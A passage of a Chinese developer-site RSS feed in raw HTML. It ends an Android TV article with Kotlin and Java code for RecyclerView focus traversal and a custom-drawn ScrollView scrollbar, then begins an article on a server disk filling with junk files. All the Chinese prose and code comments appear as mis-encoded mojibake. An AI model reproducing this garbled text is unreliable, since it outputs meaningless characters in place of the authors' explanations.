        <span class="hljs-comment">// ä½¿ç”¨ scrollToPositionWithOffsetï¼Œå°† offset è®¾ç½®ä¸º 0ï¼Œå³å¯ä¿è¯ Item æ»šåŠ¨åˆ°é¡¶éƒ¨</span>
        lm.scrollToPositionWithOffset(position, <span class="hljs-number">0</span>);
        Log.d(TAG, <span class="hljs-string">"Instantly scrolled to position "</span> + position + <span class="hljs-string">" at top with offset 0."</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¯¹äºéçº¿æ€§å¸ƒå±€ï¼ˆå¦‚ StaggeredGridLayoutManagerï¼‰ï¼Œå¯èƒ½éœ€è¦å…¶ä»–ç­–ç•¥ã€‚</span>
        Log.w(TAG, <span class="hljs-string">"LayoutManager is not LinearLayoutManager. Using basic scrollToPosition."</span>);
        recyclerView.scrollToPosition(position);
    }
}

</code></pre>
<h4 data-id="heading-11">Zå­—å½¢èµ°ç„¦</h4>
<p>ä»€ä¹ˆæ˜¯èµ°ç„¦ç‚¹å‘¢ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œç½‘æ ¼å±•ç¤ºå¯èƒ½éœ€è¦ç”¨åˆ°è¿™ç§æ–¹æ³•ã€‚</p>
<p>ç½‘æ ¼ä¸­æŒ‰å·¦æˆ–è€…å³é”®ï¼Œå¦‚æœè¾¹ç¼˜Viewèšç„¦ï¼ŒæŒ‰å·¦é”®ï¼Œå¯èƒ½æ— æ³•èšç„¦åˆ°å…¶ä»–Viewã€‚äºæ˜¯ï¼Œéœ€æ±‚ä¾§å¸Œæœ›ä»ååˆ°å‰æˆ–è€…ä»å‰åˆ°åä¾æ¬¡éå†ItemViewï¼Œä¹Ÿå°±æ˜¯Zå­—å½¢éå†ã€‚</p>
<p>é‚£è¿™ç§æˆ‘ä»¬çš„åŠæ³•å½“ç„¶æ˜¯è·å–å½“å‰Itemæ‰€åœ¨RecyclerViewä¸­å¯ä»¥èšç„¦çš„Itemï¼Œå¼ºåˆ¶è®¾ç½®ç„¦ç‚¹å³å¯ï¼Œé‡ç‚¹æ˜¯ä½¿ç”¨ä¸‹é¢æ–¹æ³•ã€‚</p>
<p>recyclerView.addFocusables(focusableViews, direction)</p>
<p>ä¸‹é¢æ˜¯æºç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-built_in">this</span>.adapter!!.setBorderFocusListener { focused, direction -&gt;

    <span class="hljs-keyword">if</span>(direction == FOCUS_LEFT || direction == FOCUS_RIGHT){
        <span class="hljs-comment">//æ‰¾åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ </span>
        <span class="hljs-type">val</span> <span class="hljs-variable">focusableViews</span> <span class="hljs-operator">=</span> java.util.ArrayList&lt;View&gt;()
        recyclerView.addFocusables(focusableViews, direction)
        <span class="hljs-keyword">if</span> (focusableViews.isEmpty()) {
            <span class="hljs-keyword">return</span><span class="hljs-meta">@setBorderFocusListener</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-comment">// ç„¦ç‚¹è§„åˆ™éµå¾ªZå­—å‹åŸåˆ™</span>
        <span class="hljs-keyword">for</span> (index in focusableViews.indices) {
            <span class="hljs-type">val</span> <span class="hljs-variable">focusableView</span> <span class="hljs-operator">=</span> focusableViews[index]
            <span class="hljs-keyword">if</span> (focusableView === focused) {
                <span class="hljs-type">val</span> <span class="hljs-variable">nextFocusedViewIndex</span> <span class="hljs-operator">=</span>
                    <span class="hljs-keyword">if</span> (direction == FOCUS_LEFT) index - <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> index + <span class="hljs-number">1</span>
                <span class="hljs-keyword">if</span> (nextFocusedViewIndex &gt;= <span class="hljs-number">0</span> &amp;&amp; nextFocusedViewIndex &lt; focusableViews.size) {
                    <span class="hljs-type">val</span> <span class="hljs-variable">nextFocusableView</span> <span class="hljs-operator">=</span> focusableViews[nextFocusedViewIndex]
                    nextFocusableView.requestFocus()
                    <span class="hljs-keyword">return</span><span class="hljs-meta">@setBorderFocusListener</span> <span class="hljs-literal">true</span>
                }

                <span class="hljs-keyword">if</span>(nextFocusedViewIndex &lt; <span class="hljs-number">0</span> || nextFocusedViewIndex &gt;= adapter!!.itemCount){
                    <span class="hljs-keyword">return</span><span class="hljs-meta">@setBorderFocusListener</span> <span class="hljs-literal">true</span>
                }

                <span class="hljs-keyword">break</span>
            }
        }
    }
    <span class="hljs-literal">false</span>
}
</code></pre>
<h3 data-id="heading-12">Scrollbaræ— æ³•èšç„¦</h3>
<p>ScrollViewçš„ScrollBarå¦‚æœè®¾ç½®Selector Drawableï¼Œåœ¨Android 6.0ä¸Šæ— æ³•èšç„¦åå˜è‰²ï¼Œè¿™ç§æƒ…å†µå…¶å®æ˜¯æ—©æœŸAndroidç³»ç»Ÿçš„é—®é¢˜ï¼ŒåŒ…æ‹¬androidxçš„NestScrollViewä¹Ÿå¹¶æ²¡æœ‰è§£å†³æ­¤é—®é¢˜ã€‚</p>
<p>é‚£ï¼Œè¿™é‡Œæˆ‘ä»¬çš„è§£å†³æ–¹æ³•å½“ç„¶æ˜¯è‡ªè¡Œç»˜åˆ¶äº†</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScrollbarFixScrollView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ScrollView</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Paint paint;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RectF</span> <span class="hljs-variable">rect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RectF</span>();

    <span class="hljs-comment">// æ»šåŠ¨æ¡çš„ç”»ç¬”</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SCROLLBAR_WIDTH_DP</span> <span class="hljs-operator">=</span> <span class="hljs-number">4</span>;
    <span class="hljs-comment">// æ»šåŠ¨æ¡çš„æœ€å°é«˜åº¦ï¼ˆé˜²æ­¢å†…å®¹è¿‡é•¿æ—¶å¤ªå°ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MIN_THUMB_HEIGHT_DP</span> <span class="hljs-operator">=</span> <span class="hljs-number">16</span>;
    <span class="hljs-comment">// æ»šåŠ¨æ¡çš„åœ†è§’åŠå¾„</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">SCROLLBAR_RADIUS_DP</span> <span class="hljs-operator">=</span> <span class="hljs-number">2f</span>;

    <span class="hljs-comment">// dpåˆ°pxçš„è½¬æ¢ç³»æ•°</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> mDensity;

    <span class="hljs-keyword">private</span> FocusSearchListener focusSearchListener;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ScrollbarFixScrollView</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-built_in">super</span>(context);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ScrollbarFixScrollView</span><span class="hljs-params">(Context context, AttributeSet attrs)</span> {
        <span class="hljs-built_in">super</span>(context, attrs);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ScrollbarFixScrollView</span><span class="hljs-params">(Context context, AttributeSet attrs, <span class="hljs-type">int</span> defStyleAttr)</span> {
        <span class="hljs-built_in">super</span>(context, attrs, defStyleAttr);
    }


    {

        <span class="hljs-built_in">this</span>.paint = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Paint</span>();
        <span class="hljs-comment">// åˆå§‹åŒ–ç”»ç¬”ï¼šè®¾ç½®é¢œè‰²å’Œæ ·å¼</span>
        <span class="hljs-built_in">this</span>.paint.setAntiAlias(<span class="hljs-literal">true</span>); <span class="hljs-comment">// æŠ—é”¯é½¿</span>
        <span class="hljs-built_in">this</span>.paint.setStyle(Paint.Style.FILL);
        <span class="hljs-built_in">this</span>.mDensity = getContext().getResources().getDisplayMetrics().density;
        <span class="hljs-keyword">if</span>(Build.VERSION.SDK_INT &lt;= Build.VERSION_CODES.M) {
            setHorizontalScrollBarEnabled(<span class="hljs-literal">false</span>);
            setVerticalScrollBarEnabled(<span class="hljs-literal">false</span>);
            refreshScrollbarState(<span class="hljs-literal">false</span>);
        }

    }


    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFocusChanged</span><span class="hljs-params">(<span class="hljs-type">boolean</span> gainFocus, <span class="hljs-type">int</span> direction, Rect previouslyFocusedRect)</span> {
        <span class="hljs-built_in">super</span>.onFocusChanged(gainFocus, direction, previouslyFocusedRect);
        <span class="hljs-keyword">if</span>(Build.VERSION.SDK_INT &lt;= Build.VERSION_CODES.M) {
            refreshScrollbarState(gainFocus);
        }

    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refreshScrollbarState</span><span class="hljs-params">(<span class="hljs-type">boolean</span> gainFocus)</span> {
        <span class="hljs-keyword">if</span>(gainFocus) {
            paint.setColor(<span class="hljs-number">0xFFF04F43</span>);
        }<span class="hljs-keyword">else</span>{
            paint.setColor(<span class="hljs-number">0xFFBDBDBD</span>);
        }
    }


    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatchDraw</span><span class="hljs-params">(Canvas canvas)</span> {
        <span class="hljs-built_in">super</span>.dispatchDraw(canvas);

        <span class="hljs-keyword">if</span>(Build.VERSION.SDK_INT &gt; Build.VERSION_CODES.M) {
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-keyword">if</span> (!checkScrollViewCanScroll()) {
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// å¦‚æœScrollViewæ²¡æœ‰å­Viewï¼Œæˆ–è€…å†…å®¹ä¸å¯æ»šåŠ¨ï¼Œåˆ™æ— éœ€ç»˜åˆ¶</span>
        <span class="hljs-keyword">if</span> (getChildCount() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// è·å–å†…å®¹ View</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">View</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> getChildAt(<span class="hljs-number">0</span>);

        <span class="hljs-comment">// è§†å›¾é«˜åº¦ï¼ˆScrollViewçš„å¯è§†åŒºåŸŸé«˜åº¦ï¼‰</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">viewportHeight</span> <span class="hljs-operator">=</span> getHeight();
        <span class="hljs-comment">// å†…å®¹æ€»é«˜åº¦</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">contentHeight</span> <span class="hljs-operator">=</span> content.getHeight();

        <span class="hljs-comment">// å½“å‰æ»šåŠ¨çš„Yè½´åç§»é‡</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">scrollY</span> <span class="hljs-operator">=</span> getScrollY();

        <span class="hljs-comment">// å¦‚æœå†…å®¹æ¯”å¯è§†åŒºåŸŸå°ï¼Œä¸ç»˜åˆ¶æ»šåŠ¨æ¡</span>
        <span class="hljs-keyword">if</span> (contentHeight &lt;= viewportHeight) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// ------------------ 2. æ»šåŠ¨æ¡é«˜åº¦è®¡ç®— ------------------</span>

        <span class="hljs-comment">// æ»šåŠ¨æ¡å®½åº¦ (è½¬æ¢ä¸ºåƒç´ )</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">thumbWidth</span> <span class="hljs-operator">=</span> SCROLLBAR_WIDTH_DP * mDensity;

        <span class="hljs-comment">// æ»šåŠ¨æ¡çš„ç†è®ºæ¯”ä¾‹é«˜åº¦</span>
        <span class="hljs-type">float</span> <span class="hljs-variable">thumbHeightRatio</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>) viewportHeight / contentHeight;
        <span class="hljs-type">float</span> <span class="hljs-variable">thumbHeight</span> <span class="hljs-operator">=</span> thumbHeightRatio * viewportHeight;

        <span class="hljs-comment">// é™åˆ¶æ»šåŠ¨æ¡æœ€å°é«˜åº¦ (è½¬æ¢ä¸ºåƒç´ )</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">minThumbHeight</span> <span class="hljs-operator">=</span> MIN_THUMB_HEIGHT_DP * mDensity;
        <span class="hljs-keyword">if</span> (thumbHeight &lt; minThumbHeight) {
            thumbHeight = minThumbHeight;
        }

        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">maxScrollRange</span> <span class="hljs-operator">=</span> contentHeight - viewportHeight;
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">maxThumbTravel</span> <span class="hljs-operator">=</span> viewportHeight - thumbHeight;
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">scrollRatio</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>) scrollY / maxScrollRange;
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">thumbY</span> <span class="hljs-operator">=</span> scrollRatio * maxThumbTravel;

        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">rightX</span> <span class="hljs-operator">=</span> getWidth();
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">leftX</span> <span class="hljs-operator">=</span> rightX - thumbWidth;

        rect.set(leftX, thumbY + scrollY, rightX, thumbY + scrollY + thumbHeight);
        <span class="hljs-type">float</span> <span class="hljs-variable">radius</span> <span class="hljs-operator">=</span> SCROLLBAR_RADIUS_DP * mDensity;
        canvas.drawRoundRect(rect, radius, radius, paint);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkScrollViewCanScroll</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ScrollView</span> <span class="hljs-variable">contentScrollView</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>;
        <span class="hljs-type">View</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> contentScrollView.getChildAt(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">if</span> (child != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">int</span> <span class="hljs-variable">childHeight</span> <span class="hljs-operator">=</span> child.getHeight();
            <span class="hljs-keyword">return</span> contentScrollView.getHeight() &lt; childHeight + contentScrollView.getPaddingTop() + contentScrollView.getPaddingBottom();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFocusSearchListener</span><span class="hljs-params">(FocusSearchListener focusSearchListener)</span> {
        <span class="hljs-built_in">this</span>.focusSearchListener = focusSearchListener;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">focusSearch</span><span class="hljs-params">(<span class="hljs-type">int</span> direction)</span> {
        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.focusSearchListener != <span class="hljs-literal">null</span>){
            <span class="hljs-type">View</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> findFocus();
            <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.focusSearchListener.onFocusSearch(current, direction);
            <span class="hljs-keyword">if</span>(view != <span class="hljs-literal">null</span>){
                <span class="hljs-keyword">return</span> view;
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.focusSearch(direction);
    }
}
</code></pre>
<p>è¿™é‡Œï¼Œæˆ‘ä»¬æ€»ç»“äº†äº‹ä»¶å’Œç„¦ç‚¹çš„åˆ†å‘ä¼ é€’ï¼Œä¹Ÿæ€»ç»“äº†å¸¸è§çš„é—®é¢˜ï¼Œå¯¹äºæœªå±•ç¤ºViewèšç„¦è¿™éƒ¨åˆ†ï¼Œç›®å‰åº”è¯¥è¿˜æœ‰æ›´å¥½çš„æ–¹æ¡ˆï¼Œæˆ‘ä»¬æœŸå¾…çš„æ˜¯ï¼Œå¸Œæœ›èƒ½ç›‘å¬å¸ƒå±€å®Œæˆä¹‹åå®ç°ç„¦ç‚¹ï¼Œä½†ç›®å‰ä»RecyclerViewæºç æ¥çœ‹ï¼Œéš¾åº¦å…¶å®å¾ˆå¤§ã€‚ä¸è¿‡ï¼Œæ€»ä½“è€Œè¨€postæ–¹å¼ä¹Ÿå¹¶éä¸å¥½ã€‚æˆ‘ä»¬ä¹Ÿä¼šä¸€ç›´ç ”ç©¶è·Ÿè¿›ï¼Œè™½ç„¶ç›®å‰å¤Ÿç”¨ï¼Œåç»­å¦‚æœæ¢ç´¢åˆ°æ–°çš„æ–¹æ¡ˆï¼Œä¹Ÿä¼šæ›´æ–°å¤„ç†ã€‚</p>
<h2 data-id="heading-13">æ€»ç»“</h2>
<p>æœ¬ç¯‡å°±åˆ°è¿™é‡Œã€‚</p>
<p>ä»¥ä¸Šæ˜¯æœ¬ç¯‡æ‰€æœ‰å†…å®¹ï¼Œæœ¬ç¯‡ä¸»è¦è®¨è®ºçš„TVç„¦ç‚¹çš„ä¸€äº›äº‹æƒ…ï¼Œç‰¹åˆ«æ˜¯ç„¦ç‚¹çš„åˆ†å‘ã€æ‹¦æˆªï¼Œä»¥åŠRecyclerViewä¸€ç³»åˆ—ç„¦ç‚¹é—®é¢˜å’Œè§£å†³æ–¹æ³•ï¼Œå¸Œæœ›å¯¹ä½ æœ‰æ‰€å¸®åŠ©ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¥¹é—®æˆ‘ï¼šæœåŠ¡å™¨å¿«è¢«åƒåœ¾æ–‡ä»¶å¡çˆ†äº†ï¼Œæ€ä¹ˆç ´ï¼Ÿæˆ‘è¯´ï¼šç»™æ–‡ä»¶åŠä¸ªâ€œä¸´æ—¶å±…ä½è¯â€]]></title>    <link>https://juejin.cn/post/7592610104441126922</link>    <guid>https://juejin.cn/post/7592610104441126922</guid>    <pubDate>2026-01-08T03:51:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592610104441126922" data-draft-id="7592816646854311986" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¥¹é—®æˆ‘ï¼šæœåŠ¡å™¨å¿«è¢«åƒåœ¾æ–‡ä»¶å¡çˆ†äº†ï¼Œæ€ä¹ˆç ´ï¼Ÿæˆ‘è¯´ï¼šç»™æ–‡ä»¶åŠä¸ªâ€œä¸´æ—¶å±…ä½è¯â€"/> <meta itemprop="keywords" content="åç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-08T03:51:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ´›å°è±†"/> <meta itemprop="url" content="https://juejin.cn/user/2049145406229127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¥¹é—®æˆ‘ï¼šæœåŠ¡å™¨å¿«è¢«åƒåœ¾æ–‡ä»¶å¡çˆ†äº†ï¼Œæ€ä¹ˆç ´ï¼Ÿæˆ‘è¯´ï¼šç»™æ–‡ä»¶åŠä¸ªâ€œä¸´æ—¶å±…ä½è¯â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2049145406229127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ´›å°è±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:51:03.000Z" title="Thu Jan 08 2026 03:51:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ”¥ å¼€ç¯‡</h2>
<p>å‘¨äº”çš„å‚æ™šï¼Œçª—å¤–çš„æ™šéœçƒ§å¾—æ­£æ—ºï¼Œä½†æˆ‘æ²¡å¿ƒæ€æ¬£èµã€‚å› ä¸ºè¿ç»´èƒ–å“¥åˆšåˆšåœ¨ç¾¤é‡Œå‘äº†ä¸€å¼ æœåŠ¡å™¨ç£ç›˜æŠ¥è­¦çš„æˆªå›¾ï¼Œé‚£é²œçº¢çš„ <strong>92%</strong> çœ‹å¾—æˆ‘å¿ƒæƒŠè‚‰è·³ã€‚</p>
